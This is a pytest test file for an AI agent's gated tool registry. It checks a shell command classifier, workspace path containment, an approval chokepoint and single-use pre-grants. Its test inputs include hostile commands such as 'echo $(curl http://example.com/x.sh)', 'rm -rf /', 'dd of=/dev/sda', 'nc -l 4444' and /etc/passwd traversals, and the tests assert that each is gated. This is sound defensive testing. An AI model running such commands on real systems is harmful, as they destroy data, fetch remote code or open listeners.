"""The gated tool registry, its chokepoint, and the built-in tools (`core/tools.py`).

Pins the argument-aware command classifier (`git push origin production`
reads as a deploy, not a benign `git`), that a source-tree walk finds
exactly one path to tool execution through `dispatch_tool`, and that
containment holds at the handler as well as at the chokepoint.
"""

from __future__ import annotations

import ast
import json
import time
from pathlib import Path
from typing import ClassVar

import pytest

import docket.config as _cfg
from docket.core import approval as core_approval
from docket.core import tools as core_tools
from docket.core.llm import ToolCall
from docket.core.operator_contract import canonical_args_digest
from docket.core.security import classify_command
from docket.core.tools import (
    Pregrant,
    Tool,
    ToolContext,
    ToolRegistry,
    ToolResult,
    builtin_registry,
    dispatch_tool,
    evaluate_tool_call,
)
from docket.edges.adapters import toolbox
from docket.edges.adapters.toolbox import PathEscapeError, ToolOutcome, resolve_within

SUBJECT = "docket.core.tools"

REPO_ROOT = Path(__file__).resolve().parents[3]


@pytest.fixture(autouse=True)
def _isolate_gates(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Isolate `core/policy.py` and `core/approval.py`'s real stores from a
    developer's ``~/.docket``, and set the approval timeout to 0 so a gated
    call nothing grants resolves immediately (fail-closed to denied)."""
    monkeypatch.setattr(_cfg, "POLICIES_DIR", tmp_path / "_policies", raising=True)
    monkeypatch.setattr(_cfg, "APPROVALS_DIR", tmp_path / "_approvals", raising=True)
    monkeypatch.setattr(_cfg, "TOOL_APPROVAL_TIMEOUT", 0, raising=True)


@pytest.fixture
def workspace(tmp_path: Path) -> Path:
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "main.py").write_text("print('hello')\n")
    (tmp_path / "notes.md").write_text("alpha\nbeta\ngamma\n")
    return tmp_path


@pytest.fixture
def ctx(workspace: Path) -> ToolContext:
    return ToolContext(agent_id="demo-implementer", roots=(workspace,), timeout=10)


def _call(name: str, arguments: str = "{}", call_id: str = "c1") -> ToolCall:
    return ToolCall(id=call_id, name=name, arguments=arguments)


class TestCommandClassifierIsArgumentAware:
    """The headline capability: gating by binary path alone cannot tell
    `git status` from `git push origin production` -- this classifier reads
    the whole command line instead."""

    def test_allowlisted_binary_runs_unattended(self) -> None:
        assert classify_command("ls -la").action == "allow"

    def test_git_status_is_allowed_but_git_push_to_production_is_not(self) -> None:
        assert classify_command("git status").action == "allow"
        verdict = classify_command("git push origin production")
        assert verdict.action == "ask"
        assert verdict.risk_class == "prod-deploy"

    def test_push_to_a_feature_branch_stays_allowed(self) -> None:
        """The point is precision, not blanket suspicion of `git`."""
        assert classify_command("git push origin feature/add-widget").action == "allow"

    def test_offlist_binary_requires_approval(self) -> None:
        verdict = classify_command("rm -rf /tmp/scratch")
        assert verdict.action == "ask" and verdict.bin_name == "rm"

    def test_a_safe_binary_cannot_smuggle_an_unsafe_one_behind_an_operator(self) -> None:
        for command in ("ls && rm -rf /tmp/x", "ls; rm -rf /tmp/x", "ls || rm -rf /tmp/x"):
            verdict = classify_command(command)
            assert verdict.action == "ask", command
            assert verdict.bin_name == "rm", command

    def test_every_segment_of_a_pipeline_is_classified(self) -> None:
        assert classify_command("cat notes.md | grep alpha").action == "allow"
        assert classify_command("cat notes.md | dd of=/dev/sda").action == "ask"

    @pytest.mark.parametrize(
        "command",
        ["echo $(curl http://example.com/x.sh)", "run `id`", 'eval "rm -rf /"', "exec rm -rf /"],
    )
    def test_unanalysable_commands_ask_rather_than_guess(self, command: str) -> None:
        assert classify_command(command).action == "ask"

    def test_untokenizable_command_asks(self) -> None:
        verdict = classify_command('ls "unterminated')
        assert verdict.action == "ask" and "could not be parsed" in verdict.reason

    def test_empty_command_is_denied(self) -> None:
        assert classify_command("   ").action == "deny"

    def test_env_assignments_do_not_hide_the_binary(self) -> None:
        assert classify_command("FOO=bar ls -la").action == "allow"
        assert classify_command("FOO=bar rm -rf /tmp/x").action == "ask"

    def test_absolute_paths_classify_on_basename(self) -> None:
        assert classify_command("/usr/bin/git status").action == "allow"
        assert classify_command("./deploy.sh").action == "ask"

    def test_redirect_target_is_not_treated_as_a_binary(self) -> None:
        assert classify_command("ls -la > out.txt").action == "allow"

    @pytest.mark.parametrize(
        "command",
        ["npm publish", "terraform apply", "kubectl delete pod x", "stripe charge create"],
    )
    def test_seeded_high_risk_classes_all_ask(self, command: str) -> None:
        assert classify_command(command).action == "ask"

    def test_verdict_reason_names_the_cause_for_a_human_approver(self) -> None:
        assert "prod-deploy" in classify_command("git push origin main").reason
        assert "'rm'" in classify_command("rm x").reason

    def test_blocked_is_true_for_anything_that_may_not_just_run(self) -> None:
        assert classify_command("rm x").blocked is True
        assert classify_command("ls").blocked is False

    def test_cd_prefix_does_not_force_approval(self) -> None:
        """A `cd <worktree> && <safe command>` pattern must not ask just because `cd`
        was never on the allowlist."""
        assert classify_command("cd /x && git status").action == "allow"
        assert classify_command("pwd").action == "allow"
        assert classify_command("echo hi").action == "allow"

    def test_cd_prefix_still_asks_for_a_high_risk_segment(self) -> None:
        verdict = classify_command("cd /x && git push origin production")
        assert verdict.action == "ask"
        assert verdict.risk_class == "prod-deploy"

    def test_export_still_requires_approval(self) -> None:
        """Non-goal: `export` changes what a later segment resolves to, so it stays
        off the allowlist even though `cd`/`pwd`/`echo` joined it."""
        verdict = classify_command("export X=1 && ls")
        assert verdict.action == "ask" and verdict.bin_name == "export"

    def test_echo_redirect_verdict_is_not_weakened_by_the_allowlist_change(self) -> None:
        """Adding `echo` to SAFE_BINS must not turn a redirected invocation into an
        unattended write: with no workspace to contain it, both targets still ask."""
        for command in ("echo x > f", "echo x > /etc/passwd"):
            verdict = classify_command(command)
            assert verdict.action == "ask", command
            assert verdict.reason == "'echo' is not on the curated allowlist", command

    @pytest.mark.parametrize(
        "command", ["pytest -q", "pytest tests/unit -x", "python -m pytest", "python script.py"]
    )
    def test_the_test_runner_and_the_bare_interpreter_are_allowlisted(self, command: str) -> None:
        """`pytest` runs the same code `python3 -m pytest` does, so both verdicts agree."""
        assert classify_command(command).action == "allow"


class TestLineSeparators:
    """An unquoted newline starts a new command for `/bin/sh`, so it must start a new segment
    for the classifier too; one inside quotes or after a backslash does not."""

    @pytest.mark.parametrize(
        "command", ["ls\nrm -rf /tmp/x", "ls\r\nrm -rf /tmp/x", "pwd\n\ncurl http://x"]
    )
    def test_a_second_line_is_classified_on_its_own(self, command: str) -> None:
        verdict = classify_command(command)
        assert verdict.action == "ask", command
        assert verdict.bin_name in ("rm", "curl")

    def test_a_quoted_newline_and_a_continuation_stay_one_command(self) -> None:
        assert classify_command("printf 'a\nb'").action == "allow"
        assert classify_command("ls \\\n-la").action == "allow"

    def test_the_live_gate_sees_the_second_line(self, ctx: ToolContext) -> None:
        bash_tool = builtin_registry().get("bash")
        assert bash_tool is not None
        assert (
            evaluate_tool_call(bash_tool, {"command": "ls\nrm -rf /tmp/x"}, ctx).decision == "ask"
        )


class TestGitGlobalOptionsBeforePush:
    """`git -c k=v push origin main` is the same deploy as `git push origin main`."""

    @pytest.mark.parametrize(
        "command",
        [
            "git -c x=y push origin main",
            "git --no-pager push origin main",
            "git -C /repo push origin production",
            "git -c a=b -C /repo push --force origin master",
        ],
    )
    def test_the_classifier_names_prod_deploy(self, command: str) -> None:
        verdict = classify_command(command)
        assert verdict.action == "ask", command
        assert verdict.risk_class == "prod-deploy"

    def test_the_shipped_policy_matches_the_same_shapes(self) -> None:
        import re

        import yaml

        doc = yaml.safe_load(
            (REPO_ROOT / "src/docket/templates/policies/high-risk-deploy.yaml").read_text()
        )
        pattern = re.compile(doc["when"]["matches"])
        for command in ("git -c x=y push origin main", "git --no-pager push origin main"):
            assert pattern.search(command), command
        assert not pattern.search("git push origin feature/x")


class TestRedirectsIntoTheWorkspace:
    """A redirect-sensitive binary writing through `>`/`>>` to a path that resolves inside the
    workspace is the `write` tool by another name; any target docket cannot place stays an ask."""

    @pytest.mark.parametrize(
        "command",
        [
            "echo hello > notes.txt",
            "echo hello >> notes.txt",
            "echo hello > src/new.py",
            "echo 'two words' > 'my notes.txt'",
            "mkdir -p out && echo x > out/a.txt",
        ],
    )
    def test_a_target_inside_the_workspace_is_allowed(self, workspace: Path, command: str) -> None:
        verdict = classify_command(command, roots=(workspace,))
        assert verdict.action == "allow", command

    def test_an_absolute_target_inside_the_workspace_is_allowed(self, workspace: Path) -> None:
        verdict = classify_command(f"echo x > {workspace / 'abs.txt'}", roots=(workspace,))
        assert verdict.action == "allow"

    @pytest.mark.parametrize(
        "target", ["../escape.txt", "/etc/passwd", "~/x.txt", "$HOME/x.txt", "*.txt", "/dev/null"]
    )
    def test_a_target_outside_or_unresolvable_asks(self, workspace: Path, target: str) -> None:
        verdict = classify_command(f"echo x > {target}", roots=(workspace,))
        assert verdict.action == "ask", target
        assert verdict.bin_name == "echo"

    def test_a_symlink_that_leaves_the_workspace_asks(
        self, workspace: Path, tmp_path: Path
    ) -> None:
        outside = tmp_path.parent / f"{tmp_path.name}-outside"
        outside.mkdir()
        (workspace / "link").symlink_to(outside)
        assert classify_command("echo x > link/a.txt", roots=(workspace,)).action == "ask"

    def test_an_earlier_cd_makes_a_relative_target_unplaceable(self, workspace: Path) -> None:
        assert classify_command("cd src && echo x > a.txt", roots=(workspace,)).action == "ask"

    def test_a_descriptor_copy_opens_no_file(self, workspace: Path) -> None:
        assert classify_command("echo x > out.txt 2>&1", roots=(workspace,)).action == "allow"

    @pytest.mark.parametrize(
        "command", ["echo x >& ../a.txt", "echo x >| ../a.txt", "echo x &>> ../a"]
    )
    def test_every_output_redirect_spelling_is_seen(self, workspace: Path, command: str) -> None:
        """`>&`, `>|` and `&>>` open a file like `>` does; before they were not recognised at
        all, so a bare `echo x >& /etc/x` ran unattended."""
        assert classify_command(command, roots=(workspace,)).action == "ask", command
        assert classify_command(command).action == "ask", command

    def test_without_roots_every_prior_verdict_stands(self) -> None:
        assert classify_command("echo x > notes.txt").action == "ask"

    def test_a_pod_extra_bin_gets_the_same_containment(self, workspace: Path) -> None:
        extra = frozenset({"tox"})
        assert classify_command("tox -q > out.txt", extra, roots=(workspace,)).action == "allow"
        assert classify_command("tox -q > ../out.txt", extra, roots=(workspace,)).action == "ask"

    def test_the_live_gate_passes_the_context_roots(self, ctx: ToolContext) -> None:
        bash_tool = builtin_registry().get("bash")
        assert bash_tool is not None
        inside = evaluate_tool_call(bash_tool, {"command": "echo x > notes.txt"}, ctx)
        assert inside.decision == "allow"
        outside = evaluate_tool_call(bash_tool, {"command": "echo x > ../notes.txt"}, ctx)
        assert outside.decision == "ask"


class TestJailedGateStandsDownTheAllowlist:
    """Inside the envelope an off-allowlist binary is allowed; the high-risk classes stay."""

    def test_an_off_allowlist_binary_is_allowed_only_when_jailed(self) -> None:
        assert classify_command("curl https://x").action == "ask"
        assert classify_command("curl https://x", jailed=True).action == "allow"
        assert classify_command("bash -c 'make test'", jailed=True).action == "allow"

    def test_high_risk_opaque_and_unparseable_still_ask_when_jailed(self) -> None:
        assert classify_command("git push origin production", jailed=True).action == "ask"
        assert classify_command("echo $(id)", jailed=True).action == "ask"
        assert classify_command('ls "unterminated', jailed=True).action == "ask"
        assert classify_command("  ", jailed=True).action == "deny"

    def test_redirect_containment_holds_for_every_binary_when_jailed(self, workspace: Path) -> None:
        roots = (workspace,)
        assert classify_command("curl x > ../o", roots=roots, jailed=True).action == "ask"
        assert classify_command("curl x > o", roots=roots, jailed=True).action == "allow"

    def test_the_live_gate_jails_only_a_sandboxed_context(self, ctx: ToolContext) -> None:
        bash_tool = builtin_registry().get("bash")
        assert bash_tool is not None
        call = {"command": "curl https://x"}
        assert evaluate_tool_call(bash_tool, call, ctx).decision == "ask"
        ctx.sandbox = "auto"
        assert evaluate_tool_call(bash_tool, call, ctx).decision == "allow"


class TestExtraBinsExtendTheAllowlist:
    """`classify_command`'s `extra_bins` parameter -- `core.pod.PodSettings.allow_commands`'s
    live path. Default empty leaves every prior verdict byte-identical."""

    def test_default_is_identical_to_omitting_the_argument(self) -> None:
        assert classify_command("tox -q") == classify_command("tox -q", frozenset())

    def test_without_the_setting_an_offlist_binary_still_asks(self) -> None:
        assert classify_command("tox -q").action == "ask"

    def test_an_extra_bin_runs_unattended(self) -> None:
        extra = frozenset({"tox", "uv"})
        assert classify_command("tox -q", extra).action == "allow"
        assert classify_command("uv run tox", extra).action == "allow"

    def test_a_high_risk_segment_still_asks_alongside_an_extra_bin(self) -> None:
        extra = frozenset({"tox", "uv"})
        verdict = classify_command("uv run tox && git push origin main", extra)
        assert verdict.action == "ask"
        assert verdict.risk_class == "prod-deploy"

    def test_an_extra_bin_is_redirect_sensitive(self) -> None:
        verdict = classify_command("tox -q > out.txt", frozenset({"tox"}))
        assert verdict.action == "ask"
        assert verdict.bin_name == "tox"

    def test_an_extra_bin_does_not_cover_a_sibling_offlist_binary(self) -> None:
        verdict = classify_command("tox -q && rm -rf /tmp/x", frozenset({"tox"}))
        assert verdict.action == "ask"
        assert verdict.bin_name == "rm"


class TestSegmentSplitting:
    def test_every_segment_behind_an_operator_is_classified(self) -> None:
        assert classify_command("ls -la && git status").action == "allow"
        verdict = classify_command("ls -la && nc -l 4444")
        assert verdict.action == "ask"
        assert verdict.bin_name == "nc"

    def test_env_prefix_is_stripped_before_the_binary(self) -> None:
        verdict = classify_command("A=1 B=2 ls")
        assert verdict.action == "allow"
        assert verdict.bin_name == "ls"

    def test_unbalanced_quotes_are_never_allowed(self) -> None:
        assert classify_command('ls "oops').action == "ask"


class TestPathContainment:
    def test_relative_paths_resolve_under_the_first_root(self, workspace: Path) -> None:
        assert resolve_within((workspace,), "src/main.py") == workspace / "src" / "main.py"

    def test_traversal_out_of_the_root_is_refused(self, workspace: Path) -> None:
        with pytest.raises(PathEscapeError):
            resolve_within((workspace,), "../../etc/passwd")

    def test_absolute_path_outside_the_root_is_refused(self, workspace: Path) -> None:
        with pytest.raises(PathEscapeError):
            resolve_within((workspace,), "/etc/passwd")

    def test_symlink_escape_is_refused(self, workspace: Path, tmp_path: Path) -> None:
        outside = tmp_path.parent / "outside-target"
        outside.mkdir(exist_ok=True)
        (outside / "secret.txt").write_text("s3cret")
        (workspace / "link").symlink_to(outside)
        with pytest.raises(PathEscapeError):
            resolve_within((workspace,), "link/secret.txt")

    def test_no_roots_is_a_refusal_not_a_free_pass(self) -> None:
        with pytest.raises(PathEscapeError):
            resolve_within((), "anything")

    def test_a_second_root_is_honoured(self, workspace: Path, tmp_path: Path) -> None:
        codebase = tmp_path.parent / "codebase-root"
        codebase.mkdir(exist_ok=True)
        (codebase / "app.py").write_text("x = 1")
        assert resolve_within((workspace, codebase), str(codebase / "app.py")).name == "app.py"


class TestBuiltinHandlers:
    def test_read_returns_content(self, workspace: Path) -> None:
        out = toolbox.read_file((workspace,), "notes.md")
        assert out.ok and out.content.startswith(f"{1}\talpha")

    def test_read_window(self, workspace: Path) -> None:
        out = toolbox.read_file((workspace,), "notes.md", offset=2, limit=1)
        assert out.content == (f"{2}\tbeta\n\n[lines 2-2 of 3; call read with offset=3 for more]")

    def test_read_outside_the_root_fails_without_reading(self, workspace: Path) -> None:
        out = toolbox.read_file((workspace,), "/etc/passwd")
        assert not out.ok and "outside the allowed roots" in out.error

    def test_write_creates_parents(self, workspace: Path) -> None:
        out = toolbox.write_file((workspace,), "deep/nested/file.txt", "body")
        assert out.ok and (workspace / "deep" / "nested" / "file.txt").read_text() == "body"

    def test_edit_refuses_a_non_unique_match(self, workspace: Path) -> None:
        (workspace / "dup.txt").write_text("x\nx\n")
        out = toolbox.edit_file((workspace,), "dup.txt", "x", "y")
        assert not out.ok and "appears 2 times" in out.error

    def test_edit_replace_all(self, workspace: Path) -> None:
        (workspace / "dup.txt").write_text("x\nx\n")
        out = toolbox.edit_file((workspace,), "dup.txt", "x", "y", replace_all=True)
        assert out.ok and (workspace / "dup.txt").read_text() == "y\ny\n"

    def test_edit_missing_string(self, workspace: Path) -> None:
        out = toolbox.edit_file((workspace,), "notes.md", "nope", "y")
        assert not out.ok and "not found" in out.error

    def test_glob_skips_symlink_targets_outside_the_root(
        self, workspace: Path, tmp_path: Path
    ) -> None:
        """glob_files should skip symlinks that resolve outside the allowed roots."""
        outside = tmp_path.parent / "outside-root"
        outside.mkdir(exist_ok=True)
        (outside / "secret.txt").write_text("secret-marker")
        (workspace / "link_to_file").symlink_to(outside / "secret.txt")
        (workspace / "normal.txt").write_text("normal content")
        # Glob should list files in workspace but not symlinks to outside
        out = toolbox.glob_files((workspace,), "**/*")
        assert out.ok
        # The glob should not include the symlink to outside
        assert "link_to_file" not in out.content
        # Normal file should be there
        assert "normal.txt" in out.content

    def test_grep_skips_symlink_targets_outside_the_root(
        self, workspace: Path, tmp_path: Path
    ) -> None:
        """grep_files should skip symlinks that resolve outside the allowed roots."""
        outside = tmp_path.parent / "outside-root"
        outside.mkdir(exist_ok=True)
        (outside / "secret.txt").write_text("secret-marker-word")
        (workspace / "link_to_file").symlink_to(outside / "secret.txt")
        (workspace / "normal.txt").write_text("normal content here")
        # Grep should search workspace files but not symlinks pointing outside
        out = toolbox.grep_files((workspace,), "")  # Any pattern that would match the file
        assert out.ok
        # The search should include normal file but not the symlink
        assert "normal.txt" in out.content
        assert "link_to_file" not in out.content

    def test_write_refuses_symlink_target_outside_root(
        self, workspace: Path, tmp_path: Path
    ) -> None:
        """write_file should refuse when the target is a symlink pointing outside the root."""
        outside = tmp_path.parent / "outside-root"
        outside.mkdir(exist_ok=True)
        (workspace / "link").symlink_to(outside)
        # Writing through the symlink should fail
        out = toolbox.write_file((workspace,), "link/newfile.txt", "content")
        assert not out.ok and "outside the allowed roots" in out.error

    def test_glob_and_grep_skip_files_under_a_symlinked_directory_outside_the_root(
        self, workspace: Path, tmp_path_factory: pytest.TempPathFactory
    ) -> None:
        outside = tmp_path_factory.mktemp("outside-dir")
        (outside / "secret.txt").write_text("dir-escape-marker\n")
        (workspace / "linkdir").symlink_to(outside, target_is_directory=True)
        globbed = toolbox.glob_files((workspace,), "linkdir/*")
        grepped = toolbox.grep_files((workspace,), "dir-escape-marker", glob="linkdir/*")
        assert globbed.ok and "secret.txt" not in globbed.content
        assert grepped.ok and "dir-escape-marker" not in grepped.content

    def test_internal_symlinks_still_work(self, workspace: Path) -> None:
        """Symlinks that point inside the root should continue to work."""
        # Create a file and a symlink to it within the workspace
        (workspace / "target.txt").write_text("target content")
        (workspace / "link").symlink_to(workspace / "target.txt")
        # Reading through the internal symlink should work
        out = toolbox.read_file((workspace,), "link")
        assert out.ok and "target content" in out.content

    def test_glob_lists_matches(self, workspace: Path) -> None:
        out = toolbox.glob_files((workspace,), "**/*.py")
        assert out.ok and "main.py" in out.content

    def test_grep_reports_path_line_text(self, workspace: Path) -> None:
        out = toolbox.grep_files((workspace,), "beta")
        assert out.ok and ":2:beta" in out.content

    def test_grep_bad_regex_is_an_error_not_a_crash(self, workspace: Path) -> None:
        out = toolbox.grep_files((workspace,), "[unclosed")
        assert not out.ok and "bad regex" in out.error

    def test_bash_runs_in_the_workspace(self, workspace: Path) -> None:
        out = toolbox.run_bash((workspace,), "pwd")
        assert out.ok and str(workspace.resolve()) in out.content

    def test_bash_reports_a_nonzero_exit_and_keeps_the_output(self, workspace: Path) -> None:
        out = toolbox.run_bash((workspace,), "printf oops; exit 3")
        assert not out.ok and "exited 3" in out.error and "oops" in out.content

    def test_bash_timeout_is_reported(self, workspace: Path) -> None:
        out = toolbox.run_bash((workspace,), "sleep 5", timeout=1)
        assert not out.ok and "timed out" in out.error

    def test_bash_env_is_injected(self, workspace: Path) -> None:
        out = toolbox.run_bash(
            (workspace,), "printf %s $DOCKET_TEST_VAR", env={"DOCKET_TEST_VAR": "ok"}
        )
        assert out.ok and out.content == "ok"

    def test_output_is_truncated_with_an_announcement(self, workspace: Path) -> None:
        big = "x" * (toolbox.MAX_OUTPUT_CHARS + 500)
        (workspace / "big.txt").write_text(big)
        out = toolbox.read_file((workspace,), "big.txt")
        assert out.ok and "[truncated:" in out.content

    def test_the_output_ceiling_is_a_live_setting(
        self, workspace: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """A small-context endpoint must be able to lower it -- 30k chars is two results away from overflowing a 16k window, and the turn dies on an HTTP 400 with no partial progress."""
        body = "x" * 5_000
        (workspace / "mid.txt").write_text(body)
        assert "[truncated:" not in toolbox.read_file((workspace,), "mid.txt").content

        monkeypatch.setattr(toolbox, "MAX_OUTPUT_CHARS", 1_000)
        out = toolbox.read_file((workspace,), "mid.txt")
        numbered_length = len(f"{1}\t{body}")
        assert out.ok and f"[truncated: {numbered_length - 1_000} more characters]" in out.content


class TestDispatchChokepoint:
    def test_unknown_tool_is_denied_with_a_readable_reason(self, ctx: ToolContext) -> None:
        res = dispatch_tool(_call("teleport"), ctx, builtin_registry())
        assert res.denied and "unknown tool" in res.reason
        assert res.denial_kind == "invalid_call"
        assert not res.executed
        assert "read" in res.reason  # lists what IS available

    def test_unparseable_arguments_fail_closed(self, ctx: ToolContext) -> None:
        res = dispatch_tool(_call("read", "{not json"), ctx, builtin_registry())
        assert res.denied and not res.executed
        assert res.denial_kind == "invalid_call"

    def test_missing_required_argument_is_denied_before_any_side_effect(
        self, ctx: ToolContext
    ) -> None:
        res = dispatch_tool(_call("write", '{"path": "x.txt"}'), ctx, builtin_registry())
        assert res.denied and "content" in res.reason
        assert res.denial_kind == "invalid_call"
        assert not (ctx.roots[0] / "x.txt").exists()

    def test_allowed_call_executes(self, ctx: ToolContext) -> None:
        res = dispatch_tool(_call("read", '{"path": "notes.md"}'), ctx, builtin_registry())
        assert res.ok and res.executed and res.decision == "allow"
        assert res.content.startswith(f"{1}\talpha")

    def test_gated_command_is_not_executed(self, ctx: ToolContext) -> None:
        """An `ask` verdict blocks on the real approval store (`_isolate_gates` above pins TOOL_APPROVAL_TIMEOUT to 0), so with nothing ever granting it, it resolves to a fail-closed deny before `dispatch_tool` returns."""
        marker = ctx.roots[0] / "should-not-exist"
        res = dispatch_tool(
            _call("bash", '{"command": "rm -rf /tmp/x && touch ' + str(marker) + '"}'),
            ctx,
            builtin_registry(),
        )
        assert res.denied and not res.executed
        assert not marker.exists()

    def test_allowlisted_command_is_executed(self, ctx: ToolContext) -> None:
        res = dispatch_tool(_call("bash", '{"command": "ls"}'), ctx, builtin_registry())
        assert res.executed and res.decision == "allow"

    def test_ctx_allow_commands_reaches_the_live_gate(self, workspace: Path) -> None:
        extended = ToolContext(
            agent_id="demo-implementer", roots=(workspace,), timeout=10, allow_commands=("tox",)
        )
        res = dispatch_tool(_call("bash", '{"command": "tox -q"}'), extended, builtin_registry())
        assert res.executed and res.decision == "allow"

    def test_a_bare_ctx_without_allow_commands_still_asks(self, ctx: ToolContext) -> None:
        res = dispatch_tool(_call("bash", '{"command": "tox -q"}'), ctx, builtin_registry())
        assert res.denied and not res.executed

    def test_a_raising_handler_returns_a_result_instead_of_unwinding_the_turn(
        self, ctx: ToolContext
    ) -> None:
        def _boom(args: dict[str, object], _ctx: ToolContext) -> ToolOutcome:
            raise RuntimeError("handler exploded")

        registry = ToolRegistry()
        registry.register(
            Tool(name="boom", description="", parameters={"type": "object"}, handler=_boom)
        )
        res = dispatch_tool(_call("boom"), ctx, registry)
        assert res.executed and not res.ok and "handler exploded" in res.error

    def test_decision_and_outcome_are_distinguishable(self, ctx: ToolContext) -> None:
        """A refusal and a failed run are different events; the audit log has to be able to tell them apart."""
        refused = dispatch_tool(_call("bash", '{"command": "rm x"}'), ctx, builtin_registry())
        failed = dispatch_tool(_call("read", '{"path": "nope.md"}'), ctx, builtin_registry())
        # An `ask` verdict resolves before dispatch_tool returns (see
        # test_gated_command_is_not_executed) -- unresolved here too.
        assert (refused.decision, refused.executed) == ("deny", False)
        assert (failed.decision, failed.executed, failed.ok) == ("allow", True, False)


class TestParkMode:
    """``approval_mode="park"`` (ADR 0016 §2): the chokepoint records the exact call
    and ends the turn without waiting -- unlike "wait", nothing here blocks the
    calling thread on ``wait_for_approval``."""

    def test_park_records_the_call_and_returns_without_waiting(self, ctx: ToolContext) -> None:
        ctx.approval_mode = "park"
        start = time.monotonic()
        res = dispatch_tool(_call("bash", '{"command": "rm x"}'), ctx, builtin_registry())
        elapsed = time.monotonic() - start

        assert elapsed < 1.0
        assert not res.executed
        assert res.decision == "deny"
        assert res.denial_kind == "approval_parked"
        assert res.approval_token

        pending = core_approval.list_pending()
        assert len(pending) == 1
        record = pending[0]
        assert record["token"] == res.approval_token
        assert record["context"]["tool"] == "bash"
        assert record["context"]["parked"] is True
        assert record["context"]["argsDigest"] == canonical_args_digest("bash", {"command": "rm x"})

    def test_park_names_the_task_it_serves(self, ctx: ToolContext) -> None:
        """The inbox folds a parked approval into its task only through `context.taskId`;
        without it the same approval is listed, and notified, twice."""
        ctx.approval_mode = "park"
        ctx.task_id = "task-42"
        dispatch_tool(_call("bash", '{"command": "rm x"}'), ctx, builtin_registry())
        (record,) = core_approval.list_pending()
        assert record["context"]["taskId"] == "task-42"

    def test_park_without_a_task_records_no_task_id(self, ctx: ToolContext) -> None:
        ctx.approval_mode = "park"
        dispatch_tool(_call("bash", '{"command": "rm x"}'), ctx, builtin_registry())
        (record,) = core_approval.list_pending()
        assert "taskId" not in record["context"]

    def test_park_records_the_calling_project_and_role(self, workspace: Path) -> None:
        ctx = ToolContext(
            agent_id="demo-implementer",
            roots=(workspace,),
            timeout=10,
            project="alpha",
            role="implementer",
            approval_mode="park",
        )
        res = dispatch_tool(_call("bash", '{"command": "rm x"}'), ctx, builtin_registry())
        record = core_approval.approval_get(res.approval_token)
        assert record["context"]["project"] == "alpha"
        assert record["context"]["role"] == "implementer"

    def test_park_carries_the_given_expiry_onto_the_record(self, ctx: ToolContext) -> None:
        ctx.approval_mode = "park"
        ctx.approval_expires_at = "2099-01-01T00:00:00Z"
        res = dispatch_tool(_call("bash", '{"command": "rm x"}'), ctx, builtin_registry())
        record = core_approval.approval_get(res.approval_token)
        assert record["expiresAt"] == "2099-01-01T00:00:00Z"


class TestPreGrants:
    """A single-use pre-grant (a human already approved this exact call, ahead of
    time) is checked first in the ask branch, regardless of ``approval_mode``."""

    def test_a_matching_pregrant_runs_the_handler_without_asking(self, ctx: ToolContext) -> None:
        digest = canonical_args_digest("bash", {"command": "rm x"})
        token = core_approval.create_pregrant("operator", "tool", "bash", digest, channel="cli")
        ctx.approval_mode = "refuse"  # a pre-grant must win even over "refuse"
        ctx.pregrants = (Pregrant(token=token, tool="bash", args_digest=digest),)

        mismatch = dispatch_tool(_call("bash", '{"command": "rm y"}'), ctx, builtin_registry())
        assert mismatch.decision == "deny"  # this call's own digest never matched the grant

        matching = dispatch_tool(_call("bash", '{"command": "rm x"}'), ctx, builtin_registry())
        assert matching.decision == "allow"
        assert matching.executed
        assert matching.approval_token == token

    def test_an_identical_second_call_asks_again(self, ctx: ToolContext) -> None:
        digest = canonical_args_digest("bash", {"command": "rm x"})
        token = core_approval.create_pregrant("operator", "tool", "bash", digest, channel="cli")
        ctx.pregrants = (Pregrant(token=token, tool="bash", args_digest=digest),)

        first = dispatch_tool(_call("bash", '{"command": "rm x"}', "c1"), ctx, builtin_registry())
        second = dispatch_tool(_call("bash", '{"command": "rm x"}', "c2"), ctx, builtin_registry())

        assert first.decision == "allow"
        assert second.decision == "deny"  # the pre-grant was already spent
        assert second.approval_token != token

    def test_a_different_argument_does_not_match(self, ctx: ToolContext) -> None:
        digest = canonical_args_digest("bash", {"command": "rm x"})
        token = core_approval.create_pregrant("operator", "tool", "bash", digest, channel="cli")
        ctx.pregrants = (Pregrant(token=token, tool="bash", args_digest=digest),)

        res = dispatch_tool(_call("bash", '{"command": "rm y"}'), ctx, builtin_registry())
        assert res.decision == "deny"
        assert core_approval.consume_pregrant(token) is True  # never spent by the mismatch above


class TestResultReportedBackToTheModel:
    def test_denial_is_spoken_not_silent(self) -> None:
        res = ToolResult(
            ok=False,
            decision="deny",
            reason="no such tool",
            denial_kind="invalid_call",
        )
        assert res.as_tool_output() == "REFUSED [invalid_call]: no such tool"

    def test_pending_approval_is_spoken(self) -> None:
        res = ToolResult(ok=False, decision="ask", reason="needs a human")
        assert res.as_tool_output().startswith("AWAITING APPROVAL")

    def test_success_returns_the_content_verbatim(self) -> None:
        assert ToolResult(ok=True, content="body").as_tool_output() == "body"

    def test_failure_surfaces_the_error(self) -> None:
        res = ToolResult(ok=False, error="not a file: x", executed=True)
        assert "not a file: x" in res.as_tool_output()


class TestRegistry:
    @pytest.fixture(autouse=True)
    def _fetch_allowlisted(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """`fetch` is offered only with an allowlist (agent-loop requirement 83); these tests
        describe the full built-in set."""
        monkeypatch.setattr(_cfg, "FETCH_ALLOWED_DOMAINS", ("api.example.test",), raising=True)

    def test_builtins_present(self) -> None:
        assert builtin_registry().names() == [
            "bash",
            "consult",
            "edit",
            "fetch",
            "glob",
            "grep",
            "read",
            "skill",
            "write",
        ]

    def test_specs_carry_schemas_the_model_can_use(self) -> None:
        specs = {s.name: s for s in builtin_registry().specs()}
        assert specs["bash"].parameters["required"] == ["command"]
        assert specs["read"].description

    def test_without_narrows_the_set(self) -> None:
        readonly = builtin_registry().without("write", "edit", "bash")
        assert "write" not in readonly and "read" in readonly
        assert len(readonly) == 6

    def test_a_narrowed_registry_denies_the_removed_tool(self, ctx: ToolContext) -> None:
        readonly = builtin_registry().without("write")
        res = dispatch_tool(_call("write", '{"path":"x","content":"y"}'), ctx, readonly)
        assert res.denied and not (ctx.roots[0] / "x").exists()

    def test_without_kind_narrows_by_capability_not_name(self) -> None:
        """Sibling of `without()`, keyed on `Tool.kind` -- the mechanism `core.archetypes.registry_for_role` uses to exclude a namespaced (e.g. MCP-adapted) tool no name-based denylist could spell out in advance. See that module's docstring for the full reasoning."""
